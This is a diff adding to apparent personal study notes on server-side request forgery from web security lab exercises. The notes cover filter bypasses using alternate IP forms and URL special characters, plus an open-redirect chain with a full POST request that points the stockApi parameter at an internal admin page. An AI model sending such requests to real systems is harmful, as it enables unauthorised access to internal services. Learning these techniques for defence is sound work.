@@ -190,3 +190,33 @@ straight from the UI didn't let us do it. But then, we found the actual endpoint
 deletion, which was .../admin/deleteUser?id=id. Using the stockAPI request parameter and passing
 in the loopback network URL with the associated endpoint let us perform the deletion with no issue!
 
+- 172 and 192 are private IP addresses. SSRF can also be used to take advantage of internal backend
+systems.
+- Blacklisting IPs is also a kiddie move, as IPs seem to have alternate representations or registering
+your own domain name to be 127.0.0.1 (o.O).
+- Even whitelists can be confused by adding in URL special characters like @, #, and other things that
+leverage networking, like the DNS naming hierarchy.
+
+SSRF.1 Bypassing SSRF filters via open redirection
+..................................................
+
+- Suppose a website contains a URL which is validated for SSRF but still has the open redirection
+vulnerability. What happens here?
+Construct a valid URL which then redirects the request to the desired backend target.
+
+URL - /product/nextProduct?currentProductId=6&path=http://evil-user.net
+Redirect - http://evil-user.net
+Request to exploit vulnerability - 
+
+    POST /product/stock HTTP/1.0
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 118
+
+    stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+
+The moment you see a request parameter with a full URL, your eyes and ears should perk up because there
+may be an SSRF vulnerability there. But blind ones are tough because the app returns no response to
+take advantage of.
+
+XML external entity (XXE) injection
+-----------------------------------
